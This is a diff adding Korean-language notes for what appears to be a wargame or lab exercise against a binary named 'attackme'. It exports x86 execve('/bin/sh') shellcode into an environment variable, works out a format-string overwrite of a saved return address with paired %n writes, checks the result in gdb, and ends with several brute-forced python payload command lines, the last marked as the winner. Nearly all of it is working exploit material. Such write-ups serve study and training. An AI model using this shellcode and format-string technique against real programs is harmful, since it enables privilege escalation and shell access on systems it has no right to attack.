@@ -1,0 +1,43 @@
+#0. 환경변수
+export key=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"`
+
+shell env   : 
+             1번째 환경변수 0xbffffc3e 
+              0xfc3e
+              0xbfff
+
+             2번째 환경변수 0xbffffc26
+RET         : 0xbffffaac        
+
+
+payload 큰 그림
+1. 버퍼[0] + 버퍼[2] + 0xfc3f + %n + 0xbfff + %n
+                      ret[2]         ret[0]
+
+#RET의 값 계산
+2. 버퍼[0] + 버퍼[2] + %[0xfc3f-8]x + %n + %[0xbfff-0xfc3f]x + $n
+   | --- 8byte --- |  |---0xfc3fbyte---|  | --- 0xbffffbyte  ---|
+
+#RET의 값 쓰기
+3. 버퍼[0] + 버퍼[2] + %64566x + %4\$n + %50113x + %5\$n
+
+#버퍼(RET) 잎의 값 
+4. "\xda\xcc\xbb\xaa" + "\xdc\xcc\xbb\xaa" + "%64566x" + "%4\$n" + "%50113x" + "%5\$n"
+
+#버퍼 주소를 확인하기 위한 임시 페이로드
+5. `python -c 'print "\xda\xcc\xbb\xaa" + "\xdc\xcc\xbb\xaa" + "%64566x" + "%4\$n" + "%50113x" + "%5\$n"'`
+
+#버퍼(RET) 수정
+5. `python -c 'print "\xac\xfa\xff\xbf" + "\xae\xfa\xff\xbf" + "%64566x" + "%4\$n" + "%50113x" + "%5\$n"'`
+                      
+6. gdb에 RET값이 바뀌는지 확인
+#1차시도 : ret값이 바뀜. 값도 정확히 일치함.
+(gdb) x/x 0xbffffaac
+0xbffffaac:	0xbffffc3e
+
+#######공격
+./attackme `python -c 'print "\xdc\xfa\xff\xbf" + "\xde\xfa\xff\xbf" + "%64542x" + "%4\$n" + "%50137x" + "%5\$n"'`
+./attackme `python -c 'print "\xcc\xfa\xff\xbf" + "\xce\xfa\xff\xbf" + "%64542x" + "%4\$n" + "%50137x" + "%5\$n"'`
+./attackme `python -c 'print "\xbc\xfa\xff\xbf" + "\xbe\xfa\xff\xbf" + "%64542x" + "%4\$n" + "%50137x" + "%5\$n"'`
+./attackme `python -c 'print "\xac\xfa\xff\xbf" + "\xae\xfa\xff\xbf" + "%64542x" + "%4\$n" + "%50137x" + "%5\$n"'`
+./attackme `python -c 'print "\x9c\xfa\xff\xbf" + "\x9e\xfa\xff\xbf" + "%64542x" + "%4\$n" + "%50137x" + "%5\$n"'` <--- 빙고
